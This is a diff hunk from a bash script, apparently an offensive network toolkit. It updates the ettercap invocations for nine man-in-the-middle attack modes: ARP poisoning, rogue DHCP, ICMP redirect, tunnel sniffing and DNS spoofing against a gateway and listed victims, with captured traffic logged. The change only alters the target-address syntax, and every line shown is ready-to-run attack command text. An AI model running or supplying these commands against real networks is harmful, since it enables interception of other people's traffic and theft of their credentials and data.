@@ -452,23 +452,23 @@ echo -e "\e[1;34m[*]\e[0m Launching ettercap, poisoning specified hosts."
 y=$(($y+$yoffset))
 case ${etterlaunch} in
 	1) type="[arp:remote]"
-	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}// ///" ;;
 	2) type="[arp:remote]"
-	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}// /${VICS}/" ;;
 	3) type="[arp:oneway]"
-	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} // /${GW}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /// /${GW}//" ;;
 	4) type="[arp:oneway]"
-	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${VICS}/ /${GW}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${VICS}/ /${GW}//" ;;
 	5) type="[dhcp:${POOL}/${MASK}/${DNS}/]"
 	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M dhcp:${POOL}/${MASK}/${DNS}/" ;;
 	6) type="[icmp:${GATEMAC}/${GATEIP}]"
 	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M icmp:${GATEMAC}/${GATEIP}" ;;
 	7) type="[tunnel]"
-	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} // //" ;;
+	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} /// ///" ;;
 	8) type="[dns_spoof:arp]"
-	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
+	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}// ///" ;;
 	9) type="[dns_spoof:arp]"
-	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
+	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}// /${VICS}/" ;;
 	esac
 
 	if [ ! -z ${isxrunning} ]; then
